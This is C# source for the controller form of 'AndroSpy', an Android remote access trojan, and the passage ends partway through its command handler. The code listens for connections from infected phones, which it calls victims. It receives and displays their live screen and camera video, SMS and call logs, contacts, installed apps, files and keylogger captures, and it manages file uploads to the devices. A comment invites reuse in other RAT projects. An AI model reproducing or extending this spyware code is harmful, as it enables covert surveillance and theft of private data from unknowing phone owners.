using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SV
{
    /*
     * Project: AndroSpy
     * Date: 24.01.2021
     * Coded By qH0sT' 2021
     * Language: C#.NET
     * I Y I
     * Made in Turkey
    */
    public partial class Form1 : MetroFramework.Forms.MetroForm
    {
        public List<Kurbanlar> kurban_listesi = new List<Kurbanlar>();
        public Dictionary<string, infoAl> receiveClasses = new Dictionary<string, infoAl>();

        Socket soketimiz = default;
        public Form1()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            if (new Port().ShowDialog() == DialogResult.OK)
            {
                notifyIcon1.ShowBalloonTip(2000);
                Dinle();

            }
            else
            {
                Environment.Exit(0);
            }
        }
        public static int port_no = 9999;
        public static string PASSWORD = string.Empty;
        public void Dinle()
        {
            try
            {
                soketimiz = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                soketimiz.SendTimeout = -1; soketimiz.ReceiveTimeout = -1; soketimiz.SendBufferSize = int.MaxValue;
                soketimiz.ReceiveBufferSize = int.MaxValue;
                soketimiz.NoDelay = true;
                soketimiz.Bind(new IPEndPoint(IPAddress.Any, port_no));
                metroLabel1.Text = "Port: " + port_no.ToString();
                soketimiz.Listen(int.MaxValue);
                soketimiz.BeginAccept(new AsyncCallback(Client_Kabul), soketimiz);
            }
            catch (Exception) { }
        }

        public void Client_Kabul(IAsyncResult ar)
        {
            Socket listener = (Socket)ar.AsyncState;
            Socket sock = listener.EndAccept(ar);
            sock.SendTimeout = -1; sock.ReceiveTimeout = -1;
            sock.ReceiveBufferSize = int.MaxValue; sock.SendBufferSize = int.MaxValue;
            sock.NoDelay = true;
            try
            {
                if (receiveClasses.ContainsKey(sock.Handle.ToString()))
                {
                    receiveClasses[sock.Handle.ToString()].CloseSocks();
                }
                new System.Threading.Thread(new System.Threading.ThreadStart(() =>
                {
                    infoAl inf = new infoAl(sock, this);
                    receiveClasses.Add(sock.Handle.ToString(), inf);
                }))
                { IsBackground = true }.Start();
            }
            catch (Exception) { }
            listener.BeginAccept(new AsyncCallback(Client_Kabul), listener);
        }
        //1536000
        public class infoAl : IDisposable
        {
            // feel free to use this class for your own RATs projects (: - qH0sT.
            private MemoryStream memos = new MemoryStream();
            private byte[] dataByte = new byte[1536000];
            private int blockSize = 1536000;
            private Socket tmp = default;
            private Form1 tmp_form = default;
            public infoAl(Socket sckInf, Form1 frm1)
            {               
                if (!sckInf.Connected)
                {
                    frm1.listBox1.Items.Add(sckInf.Handle.ToString() + " couldn't connect.");
                    CloseSocks();
                    return;
                }
                if (sckInf.Poll(-1, SelectMode.SelectRead) && sckInf.Available <= 0)
                {
                    frm1.listBox1.Items.Add(sckInf.Handle.ToString() + " ghost connection: Poll");
                    CloseSocks();
                    return;
                }
                if (sckInf.Available <= 0)
                {
                    frm1.listBox1.Items.Add(sckInf.Handle.ToString() + " the socket is not ready: [ghost connection]");
                    CloseSocks();
                    return;
                }

                tmp_form = frm1;
                tmp = sckInf;

                frm1.listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + sckInf.Handle.ToString() +
                        " socket session has started.");

                sckInf.BeginReceive(dataByte, 0, blockSize, SocketFlags.None, endRead, null); // classic socket receive operation.
            }
            public async void endRead(IAsyncResult ar)
            {
                if (tmp != null && tmp_form.receiveClasses.ContainsKey(tmp.Handle.ToString()))
                {
                    try
                    {
                        int readed = tmp.EndReceive(ar); // classic socket async result operation.
                        if (readed > 0)
                        {
                            if (memos != null)
                            {
                                memos.Write(dataByte, 0, readed); // write readed data to memorystream.
                                try
                                {
                                    // give as param our memorystream to our byte[] splitter,
                                    // and process the byte[] arrays as data buffer [byte[]], tag text [string] and extra infos [string]
                                    await UnPacker(tmp, memos);
                                }
                                catch (Exception) { }

                            }
                        }
                        await Task.Delay(1); // reduce high cpu usage. :)
                        if (tmp_form.receiveClasses.ContainsKey(tmp.Handle.ToString()))
                        {
                            tmp.BeginReceive(dataByte, 0, blockSize, SocketFlags.None, endRead, null);
                        }

                    }
                    catch (Exception) { }
                }
                else { CloseSocks(); }
            }

            public async Task UnPacker(Socket sck, MemoryStream ms)
            {
                //YEDEK REGEX: <[A-Z]+>\|[0-9]+\|.*?>
                //This unpacker coded by qH0sT' - 2021 - AndroSpy.
                //string letter = "qwertyuıopğüasdfghjklşizxcvbnmöç1234567890<>|";
                Regex regex = new Regex(@"<[A-Z]+>\|[0-9]+\|.*>");

                await Task.Run(() =>
                {
                    byte[][] filebytes = Separate(ms.ToArray(), Encoding.UTF8.GetBytes("SUFFIX"));
                    for (int k = 0; k < filebytes.Length - 1; k++)
                    {
                        try
                        {
                            string ch = Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 1] });// >
                            string f = Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 2] });// F>
                            string o = Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 3] });// OF>
                            string e = Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 4] });// EOF>
                            string ch_ = Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 5] });// <EOF>

                            bool isContainsEof = (ch_ + e + o + f + ch) == "<EOF>";
                            if (isContainsEof)
                            {
                                List<byte> mytagByte = new List<byte>();
                                string temp = "";
                                for (int p = 0; p < filebytes[k].Length; p++)
                                {
                                    //if (letter.Contains(Encoding.UTF8.GetString(new byte[1] { filebytes[k][p] }).ToLower()))
                                    //{
                                    temp += Encoding.UTF8.GetString(new byte[1] { filebytes[k][p] });
                                    mytagByte.Add(filebytes[k][p]);
                                    if (regex.IsMatch(temp))
                                    {
                                        break;
                                    }
                                    //}
                                }
                                string whatsTag = Encoding.UTF8.GetString(mytagByte.ToArray());

                                MemoryStream tmpMemory = new MemoryStream();
                                tmpMemory.Write(filebytes[k], 0, filebytes[k].Length);
                                tmpMemory.Write(Encoding.UTF8.GetBytes("SUFFIX"), 0, Encoding.UTF8.GetBytes("SUFFIX").Length);
                                ms.Flush();
                                ms.Close();
                                ms.Dispose();
                                ms = new MemoryStream(RemoveBytes(ms.ToArray(), tmpMemory.ToArray()));
                                memos = new MemoryStream();
                                ms.CopyTo(memos);
                                tmpMemory.Flush();
                                tmpMemory.Close();
                                tmpMemory.Dispose();
                                filebytes[k] = RemoveBytes(filebytes[k], mytagByte.ToArray());
                                filebytes[k] = RemoveBytes(filebytes[k], Encoding.UTF8.GetBytes("<EOF>"));
                                if (tmp_form.receiveClasses.ContainsKey(tmp.Handle.ToString()))
                                {
                                    
                                    // Process our datas as tag and buffer data.
                                    tmp_form.DataInvoke(sck, whatsTag, filebytes[k], this);
                                }
                                else
                                {
                                    break;
                                }


                            }
                        }
                        catch (Exception) { }

                    }
                });
            }
            public static byte[][] Separate(byte[] source, byte[] separator)
            {
                var Parts = new List<byte[]>();
                var Index = 0;
                byte[] Part;
                for (var I = 0; I < source.Length; ++I)
                {
                    if (Equals(source, separator, I))
                    {
                        Part = new byte[I - Index];
                        Array.Copy(source, Index, Part, 0, Part.Length);
                        Parts.Add(Part);
                        Index = I + separator.Length;
                        I += separator.Length - 1;
                    }
                }
                Part = new byte[source.Length - Index];
                Array.Copy(source, Index, Part, 0, Part.Length);
                Parts.Add(Part);
                return Parts.ToArray();
            }
            static bool Equals(byte[] source, byte[] separator, int index)
            {
                for (int i = 0; i < separator.Length; ++i)
                    if (index + i >= source.Length || source[index + i] != separator[i])
                        return false;
                return true;
            }
            public static byte[] RemoveBytes(byte[] input, byte[] pattern)
            {
                if (pattern.Length == 0) return input;
                var result = new List<byte>();
                for (int i = 0; i < input.Length; i++)
                {
                    var patternLeft = i <= input.Length - pattern.Length;
                    if (patternLeft && (!pattern.Where((t, j) => input[i + j] != t).Any()))
                    {
                        i += pattern.Length - 1;
                    }
                    else
                    {
                        result.Add(input[i]);
                    }
                }
                return result.ToArray();
            }
            public void CloseSocks()
            {
                if (tmp != null)
                {
                    try { tmp_form.receiveClasses.Remove(tmp.Handle.ToString()); } catch (Exception) { }
                    try { tmp.Close(); } catch (Exception) { }                    
                    try { tmp.Dispose(); } catch (Exception) { }                   
                }
                try { memos.Flush(); memos.Close(); memos.Dispose(); } catch (Exception) { }
                try { Dispose(); } catch (Exception) { }
            }
            public void Dispose()
            {
                Dispose(true);
                GC.SuppressFinalize(this);
            }
            protected bool Disposed { get; private set; }
            protected virtual void Dispose(bool disposing)
            {
                Disposed = true;
            }
        }//infoAl

        public int FindAramaCount(string ident)
        {
            var list = Application.OpenForms
          .OfType<YeniArama>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.Count();
        }
        public livescreen FindLiveScreenById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<livescreen>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Telefon FindTelephonFormById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Telefon>()
              .Where(form => string.Equals(form.uniq_id, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Rehber FindRehberById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Rehber>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public SMSYoneticisi FindSMSFormById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<SMSYoneticisi>()
              .Where(form => string.Equals(form.uniq_id, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public FİleManager FindFileManagerById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<FİleManager>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Keylogger FindKeyloggerManagerById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Keylogger>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Kamera FİndKameraById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Kamera>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public CagriKayitlari FindCagriById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<CagriKayitlari>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Ayarlar FindAyarlarById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Ayarlar>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Uygulamalar FindUygulamalarById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Uygulamalar>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Bilgiler FindBilgiById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Bilgiler>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Konum FindKonumById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Konum>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Eglence FindEglenceById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Eglence>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public DownloadManager FindDownloadManagerById(string ident)
        {
            var list = Application.OpenForms
          .OfType<DownloadManager>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public static string GetFileSizeInBytes(double sized)
        {
            try
            {
                string[] sizes = { "B", "KB", "MB", "GB", "TB" };
                double len = sized;
                int order = 0;
                while (len >= 1024 && order < sizes.Length - 1)
                {
                    order++;
                    len = len / 1024;
                }
                string result = string.Format("{0:0.##} {1}", len, sizes[order]);
                return result;
            }
            catch (Exception ex) { return ex.Message; }
        }
        public string krbnIsminiBul(string handle)
        {
            string isim = dataGridView1.Rows.Cast<DataGridViewRow>().Where(y => y.Tag.ToString() == handle).First().Cells[1].Value.ToString();
            string ip = dataGridView1.Rows.Cast<DataGridViewRow>().Where(y => y.Tag.ToString() == handle).First().Cells[2].Value.ToString();
            return isim + "@" + ip;
        }
        public void DataInvoke(Socket soket2, string tag, byte[] dataBuff, infoAl infClass)
        {

            try
            {
                switch (tag.Split('|')[0])
                {
                    //MYSCREENREADY
                    case "<MYSCREENREADY>":
                        if (receiveClasses.ContainsKey(soket2.Handle.ToString()))
                        {
                            var krbn_ = kurban_listesi.Where(x => x.identify == tag.Split('|')[2].Replace(">", "")).FirstOrDefault();
                            if (krbn_ != null)
                            {
                                var canliekran = FindLiveScreenById(krbn_.id);
                                if (canliekran != null)
                                {
                                    canliekran.infoAl = infClass;
                                }
                                else
                                {
                                    try
                                    {
                                        byte[] senddata = MyDataPacker("SCREENLIVECLOSE", Encoding.UTF8.GetBytes("ECHO"));
                                        krbn_.soket.Send(senddata, 0, senddata.Length, SocketFlags.None);
                                    }
                                    catch (Exception) { }
                                    infClass.CloseSocks(); return;
                                }
                            }
                            else
                            {
                                infClass.CloseSocks(); return;
                            }
                        }
                        else { infClass.CloseSocks(); return; }
                        break;
                    case "<MYVIDREADY>":
                        if (receiveClasses.ContainsKey(soket2.Handle.ToString()))
                        {
                            var krbn_ = kurban_listesi.Where(x => x.identify == tag.Split('|')[2].Replace(">", "")).FirstOrDefault();
                            if (krbn_ != null)
                            {
                                var shortcam_ = FİndKameraById(krbn_.id);
                                try
                                {
                                    if (shortcam_ != null)
                                    {
                                        shortcam_.infoAl = infClass;
                                    }
                                    else
                                    {
                                        try
                                        {
                                            byte[] senddata = MyDataPacker("LIVESTOP", Encoding.UTF8.GetBytes("ECHO"));
                                            krbn_.soket.Send(senddata, 0, senddata.Length, SocketFlags.None);
                                        }
                                        catch (Exception) { }
                                        infClass.CloseSocks();
                                        return;
                                    }
                                }
                                catch (Exception ex)
                                {
                                    if (shortcam_ != null)
                                    {
                                        FİndKameraById(krbn_.id).Text = ex.ToString();
                                    }
                                }
                            }
                            else
                            {
                                infClass.CloseSocks();
                                return;
                            }
                        }
                        else { infClass.CloseSocks(); return; }
                        break;
                    case "<MYIP>":
                        Invoke((MethodInvoker)delegate
                        {
                            try
                            {
                                string whats_ = Encoding.UTF8.GetString(dataBuff);
                                string[] s_ = whats_.Split(new[] { "[VERI]" }, StringSplitOptions.None);
                                Ekle(soket2, soket2.Handle.ToString(), s_[1], s_[2], s_[3], s_[4], s_[5], s_[6]);
                            }
                            catch (Exception) { }
                        });
                        break;

                    case "<OLCULER>":
                        string[] s = Encoding.UTF8.GetString(dataBuff).Split(new string[] { "[VERI]" }, StringSplitOptions.None);
                        Invoke((MethodInvoker)delegate
                        {
                            if (s[1].Contains("Kameraya"))
                            {
                                MessageBox.Show(s[1] + "\nThis error causes when camera is used by victim.", "Can't access to Camera", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                            }
                            else
                            {
                                if (FİndKameraById(soket2.Handle.ToString()) == null)
                                {
                                    Kamera msj = new Kamera(soket2, soket2.Handle.ToString());
                                    msj.Text = "Camera Manager - " + krbnIsminiBul(soket2.Handle.ToString());
                                    msj.Show();
                                }
                                FİndKameraById(soket2.Handle.ToString()).max = int.Parse(s[2].Split('}')[1]);
                                /*
                                FİndKameraById(soket2.Handle.ToString()).comboBox1.Items.Clear();
                                FİndKameraById(soket2.Handle.ToString()).comboBox2.Items.Clear();
                                string[] front = s[1].Split('>');
                                string[] _split = front[1].Split('<');
                                FİndKameraById(soket2.Handle.ToString()).max = int.Parse(s[2].Split('}')[1]);
                                FİndKameraById(soket2.Handle.ToString()).comboBox1.Items.AddRange(_split);
                                _split = front[0].Split('<');
                                FİndKameraById(soket2.Handle.ToString()).comboBox2.Items.AddRange(_split);
                                */

                                var found = FİndKameraById(soket2.Handle.ToString());
                                found.metroComboBox2.Items.Clear();
                                //MessageBox.Show(s[2].Split('}')[0]);
                                found.zoomSupport = Convert.ToBoolean(s[2].Split('}')[0].ToLower());

                                string[] presize = s[3].Split('<'); found.metroComboBox2.Items.AddRange(presize);
                                string[] cams = s[4].Split('!'); for (int p = 0; p < cams.Length; p++)
                                {
                                    if (!string.IsNullOrEmpty(cams[p]))
                                    {
                                        switch (cams[p])
                                        {
                                            case "0":
                                                cams[p] = "Back: 0";
                                                break;
                                            case "1":
                                                cams[p] = "Front: 1";
                                                break;
                                            default:
                                                cams[p] = "Unknown: " + cams[p];
                                                break;
                                        }
                                    }
                                }
                                found.metroComboBox5.Items.AddRange(cams);
                                found.metroComboBox5.SelectedIndex = 0;

                                foreach (object str_ in found.metroComboBox2.Items)
                                {
                                    if (str_.ToString().Contains("352"))
                                    {
                                        found.metroComboBox2.SelectedItem = str_;
                                    }
                                }
                                found.metroComboBox1.SelectedItem = "%70";
                            }
                        });
                        break;

                    case "<CAMREADY>":
                        if (FİndKameraById(soket2.Handle.ToString()) != null)
                        {
                            var _shortcam_ = FİndKameraById(soket2.Handle.ToString());
                            _shortcam_.metroButton3.Text = "Start"; _shortcam_.metroButton3.Enabled = true;
                            _shortcam_.metroLabel8.Text = "0 B";
                            _shortcam_.enabled = false; _shortcam_.metroLabel7.Text = "FPS: 0";
                        }
                        break;

                    case "<VID>":
                        if (receiveClasses.ContainsKey(soket2.Handle.ToString()))
                        {
                            var krbn = kurban_listesi.Where(x => x.identify == tag.Split('|')[2].Replace(">", "")).FirstOrDefault();
                            if (krbn != null)
                            {
                                var shortcam = FİndKameraById(krbn.id);
                                try
                                {
                                    if (shortcam != null)
                                    {
                                        if (shortcam.metroButton3.Text == "Stop")
                                        {

                                            using (Image im = (Image)new ImageConverter().ConvertFrom(dataBuff))
                                            {
                                                shortcam.pictureBox2.Image = shortcam.RotateImage(im);
                                                shortcam.metroLabel7.Text = "FPS: " + shortcam.CalculateFrameRate().ToString();
                                                shortcam.metroLabel8.Text = GetFileSizeInBytes(dataBuff.Length);
                                            }
                                        }
                                        else
                                        {
                                            infClass.CloseSocks();
                                            return;
                                        }
                                    }
                                    else
                                    {
                                        infClass.CloseSocks();
                                        return;
                                    }
                                }
                                catch (Exception ex)
                                {
                                    if (shortcam != null)
                                    {
                                        FİndKameraById(krbn.id).Text = ex.ToString();
                                    }
                                }
                            }
                            else
                            {
                                infClass.CloseSocks();
                                return;
                            }
                        }
                        else { infClass.CloseSocks(); return; }
                        break;

                    case "<SHORTCUT>":
                        Eglence eglnc = FindEglenceById(soket2.Handle.ToString());
                        if (eglnc != null)
                        {
                            MessageBox.Show(eglnc, Encoding.UTF8.GetString(dataBuff), "Status", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                        break;

                    case "<CAMNOT>":
                        string mess = Encoding.UTF8.GetString(dataBuff);
                        var fnd = FİndKameraById(soket2.Handle.ToString());
                        if (fnd != null)
                        {
                            Invoke((MethodInvoker)delegate
                            {

                                FİndKameraById(soket2.Handle.ToString()).label1.Visible = true;
                                fnd.enabled = false;
                                fnd.metroButton3.Text = "Start";
                                fnd.metroButton3.Enabled = true;
                            });
                            switch (mess)
                            {
                                case "OPENERR":
                                    MessageBox.Show(fnd, "The camera is used by the victim.", "Warning - Camera Using Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                                    break;
                                case "PREVERR":
                                    MessageBox.Show(fnd, "An error has occured while preview creating.", "Warning - Camera Preview Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                                    break;
                                default:
                                    MessageBox.Show(fnd, mess, "Unknown Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                                    break;
                            }
                        }
                        break;

                    case "<SMSLOGU>":
                        if (FindSMSFormById(soket2.Handle.ToString()) == null)
                        {
                            Invoke((MethodInvoker)delegate
                            {
                                SMSYoneticisi sMS = new SMSYoneticisi(soket2, soket2.Handle.ToString());
                                sMS.Text = "SMS Manager - " + krbnIsminiBul(soket2.Handle.ToString());
                                sMS.Show();
                            });
                        }
                        FindSMSFormById(soket2.Handle.ToString()).bilgileriIsle(Encoding.UTF8.GetString(dataBuff));
                        break;

                    case "<CAGRIKAYITLARI>":
                        if (FindCagriById(soket2.Handle.ToString()) == null)
                        {
                            Invoke((MethodInvoker)delegate
                            {
                                CagriKayitlari sMS = new CagriKayitlari(soket2, soket2.Handle.ToString());
                                sMS.Text = "Call Logs - " + krbnIsminiBul(soket2.Handle.ToString()); ;
                                sMS.Show();
                            });
                        }
                        FindCagriById(soket2.Handle.ToString()).bilgileriIsle(Encoding.UTF8.GetString(dataBuff));
                        break;

                    case "<REHBER>":
                        if (FindRehberById(soket2.Handle.ToString()) == null)
                        {
                            Invoke((MethodInvoker)delegate
                            {
                                Rehber sMS = new Rehber(soket2, soket2.Handle.ToString());
                                sMS.Text = "Adress Book - " + krbnIsminiBul(soket2.Handle.ToString());
                                sMS.Show();
                            });
                        }
                        FindRehberById(soket2.Handle.ToString()).bilgileriIsle(Encoding.UTF8.GetString(dataBuff));
                        break;

                    case "<APPS>":
                        if (FindUygulamalarById(soket2.Handle.ToString()) == null)
                        {
                            Invoke((MethodInvoker)delegate
                            {
                                Uygulamalar eglence = new Uygulamalar(soket2, soket2.Handle.ToString());
                                eglence.Text = "Installed Apps - " + krbnIsminiBul(soket2.Handle.ToString());
                                eglence.Show();
                            });
                        }
                        FindUygulamalarById(soket2.Handle.ToString()).bilgileriIsle(Encoding.UTF8.GetString(StringCompressor.Decompress(dataBuff)));
                        break;

                    case "<WEBCAM>":
                        /*
                         * TO-DO: TAKE A PICTURE FROM WEBCAM.
                        if (FİndKameraById(soket2.Handle.ToString()) != null)
                        {
                            try
                            {
                                int maxLenght = int.Parse(tag.Split('|')[2].Replace(">", ""));
                                //FİndKameraById(soket2.Handle.ToString()).Text = dataBuff.Length.ToString();
                                FİndKameraById(soket2.Handle.ToString()).sb.Write(dataBuff, 0, dataBuff.Length);

                                if (FİndKameraById(soket2.Handle.ToString()).sb.ToArray().Length == maxLenght)
                                {
                                    try
                                    {

                                        FİndKameraById(soket2.Handle.ToString()).label2.Text = "Captured.";
                                        FİndKameraById(soket2.Handle.ToString()).pictureBox1.Image = (Image)new ImageConverter().ConvertFrom(FİndKameraById(soket2.Handle.ToString()).sb.ToArray());

                                        FİndKameraById(soket2.Handle.ToString()).button1.Enabled = true;
                                        ((Control)FİndKameraById(soket2.Handle.ToString()).tabPage2).Enabled = true;
                                        FİndKameraById(soket2.Handle.ToString()).sb.Flush();
                                        FİndKameraById(soket2.Handle.ToString()).sb.Close();
                                        FİndKameraById(soket2.Handle.ToString()).sb.Dispose();
                                        FİndKameraById(soket2.Handle.ToString()).sb = new MemoryStream();
                                    }
                                    catch (Exception ex)
                                    {
                                        MessageBox.Show(FİndKameraById(soket2.Handle.ToString()), ex.Message, "Camera Manager - " + krbnIsminiBul(soket2.Handle.ToString()), MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                        FİndKameraById(soket2.Handle.ToString()).Text = "Camera Manager - " + krbnIsminiBul(soket2.Handle.ToString());
                                    }
                                }

                            }
                            catch (Exception ex) { MessageBox.Show(ex.ToString()); }
                        }
                        */
                        break;

                    case "<FILES>":
                        string inf = Encoding.UTF8.GetString(dataBuff);
                        string[] spl = inf.Split(new string[] { "[VERI]" }, StringSplitOptions.None);
                        if (FindFileManagerById(soket2.Handle.ToString()) == null)
                        {
                            Invoke((MethodInvoker)delegate
                            {
                                FİleManager fmanger = new FİleManager(soket2, soket2.Handle.ToString());
                                fmanger.Text = "File Manager - " + krbnIsminiBul(soket2.Handle.ToString());
                                fmanger.Show();
                            });
                        }
                        FindFileManagerById(soket2.Handle.ToString()).bilgileriIsle(spl[1], spl[2]);
                        break;

                    case "<PREVIEW>":
                        if (FindFileManagerById(soket2.Handle.ToString()) != null)
                        {
                            Invoke((MethodInvoker)delegate
                            {
                                FindFileManagerById(soket2.Handle.ToString()).pictureBox1.Image =
                                   (Image)new ImageConverter().ConvertFrom(dataBuff);
                                FindFileManagerById(soket2.Handle.ToString()).pictureBox1.Visible = true;
                            });
                        }
                        break;

                    case "<UZUNLUK>":

                        try
                        {
                            string[] bilgiler = tag.Split('|')[2].Split(new string[] { "[VERI]" }, StringSplitOptions.None);
                            int maxLenght = int.Parse(bilgiler[1]);
                            string dosyaAdi = bilgiler[2];
                            string id = bilgiler[3].Replace(">", "");
                            Kurbanlar victim = kurban_listesi.Where(x => x.identify == id).FirstOrDefault();
                            if (victim != null)
                            {
                                string path = Environment.CurrentDirectory + "\\Store\\Downloads\\" + id;
                                if (!Directory.Exists(path))
                                {
                                    Directory.CreateDirectory(path);
                                }
                                try
                                {
                                    byte[] dosyaVerisi = dataBuff;
                                    int maximum = maxLenght;
                                    string dosyaismi = dosyaAdi;

                                    Invoke((MethodInvoker)delegate
                                    {
                                        Yuzde yzdlk = FindYuzdeById(dosyaismi + "|" + path);
                                        if (receiveClasses.ContainsKey(soket2.Handle.ToString()))
                                        {
                                            if (yzdlk == null)
                                            {
                                                yzdlk = new Yuzde(dosyaismi + "|" + path, soket2, infClass);
                                                yzdlk.Text = "Download Progress - " + krbnIsminiBul(victim.id);
                                                yzdlk.Show();
                                            }
                                            yzdlk.fs.Write(dosyaVerisi, 0, dosyaVerisi.Length);
                                            yzdlk.label2.Text = dosyaismi;
                                            yzdlk.label3.Text = GetFileSizeInBytes(yzdlk.fs.Length) + "/" + GetFileSizeInBytes(maximum);
                                            decimal yuzde = yzdlk.fs.Length * 100 / maximum;
                                            yzdlk.label1.Text = "%" + yuzde.ToString();
                                            yzdlk.progressBar1.Value = Convert.ToInt32(yuzde);
                                            if (yzdlk.progressBar1.Value == 100)
                                            {
                                                FİleManager fm = FindFileManagerById(victim.id);
                                                if (fm != null)
                                                { fm.listBox1.Items.Add(DateTime.Now.ToString("HH:mm:ss") + " - File download completed => " + dosyaismi); }
                                                yzdlk.Close();
                                            }
                                        }
                                        else
                                        {
                                            infClass.CloseSocks(); return;
                                        }
                                    });

                                }
                                catch (Exception) { }
                            }
                            else
                            {
                                infClass.CloseSocks(); return;

                            }
                        }
                        catch (Exception)
                        {
                            infClass.CloseSocks(); return;

                        }

                        break;
                    case "<UPLOAD>":
                        string identifi = tag.Split('|')[2].Replace(">", "");
                        string imieid = identifi.Split(new string[] { "[ID]" }, StringSplitOptions.None)[1];
                        string[] infs = Encoding.UTF8.GetString(dataBuff).Split(new string[] { "[VERI]" }, StringSplitOptions.None);
                        string dAdi = infs[0];
                        string yz = infs[1];
                        string kbMb = infs[2];
                        string pcPath = infs[3];

                        Kurbanlar kbn = kurban_listesi.Where(x => x.identify == imieid).FirstOrDefault();
                        if (kbn != null)
                        {
                            Invoke((MethodInvoker)delegate
                            {
                                UploadProgress uping = FindUploadProgressById(identifi);
                                if (receiveClasses.ContainsKey(soket2.Handle.ToString()))
                                {
                                    if (uping == null)
                                    {
                                        uping = new UploadProgress(soket2, infClass, pcPath, identifi);
                                        uping.Text = "Upload Progress - " + krbnIsminiBul(kbn.id);
                                        uping.Show();
                                    }
                                    uping.label1.Text = dAdi;
                                    uping.progressBar1.Value = int.Parse(yz.Replace("%", ""));
                                    uping.label3.Text = yz;
                                    uping.label2.Text = kbMb;
                                    if (uping.progressBar1.Value == 100)
                                    {
                                        FİleManager fm = FindFileManagerById(kbn.id);
                                        if (fm != null)
                                        { fm.listBox1.Items.Add(DateTime.Now.ToString("HH:mm:ss") + " - File upload completed => " + dAdi); }
                                        uping.Close();
                                    }
                                }
                                else
                                {
                                    infClass.CloseSocks(); return;
                                }
                            });
                        }
                        else
                        {
                            infClass.CloseSocks(); return;
                        }
                        break;
                    case "<CHAR>":
                        try
                        {
                            FindKeyloggerManagerById(soket2.Handle.ToString()).textBox1.Text += Encoding.UTF8.GetString(dataBuff).Replace("[NEW_LINE]", Environment.NewLine)
                        + Environment.NewLine;
                        }
                        catch (Exception) { }
                        break;

                    case "<LOGDOSYA>":
                        try
                        {
                            string mydata = Encoding.UTF8.GetString(dataBuff);
                            if (FindKeyloggerManagerById(soket2.Handle.ToString()) == null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    Keylogger keylog = new Keylogger(soket2, soket2.Handle.ToString());
                                    keylog.Text = "Keylogger - " + krbnIsminiBul(soket2.Handle.ToString());
                                    keylog.Show();
                                });
                            }
                            if (mydata == "LOG_YOK")
                            {
                                FindKeyloggerManagerById(soket2.Handle.ToString()).comboBox1.Items.Add("No logs.");
                            }
                            else
                            {
                                string ok = mydata;
                                string[] ayristir = ok.Split('=');
                                for (int i = 0; i < ayristir.Length; i++)
                                {
                                    FindKeyloggerManagerById(soket2.Handle.ToString()).comboBox1.Items.Add(ayristir[i]);
                                }
                            }
                        }
                        catch (Exception) { }
                        break;

                    case "<KEYGONDER>":
                        string ok_ = Encoding.UTF8.GetString(dataBuff);
                        FindKeyloggerManagerById(soket2.Handle.ToString()).textBox2.Text = ok_.Replace("[NEW_LINE]", Environment.NewLine);
                        break;

                    case "<SESBILGILERI>":

                        if (FindAyarlarById(soket2.Handle.ToString()) == null)
                        {
                            Invoke((MethodInvoker)delegate
                            {
                                Ayarlar sMS = new Ayarlar(soket2, soket2.Handle.ToString());
                                sMS.Text = "Settings - " + krbnIsminiBul(soket2.Handle.ToString());
                                sMS.Show();
                            });
                        }
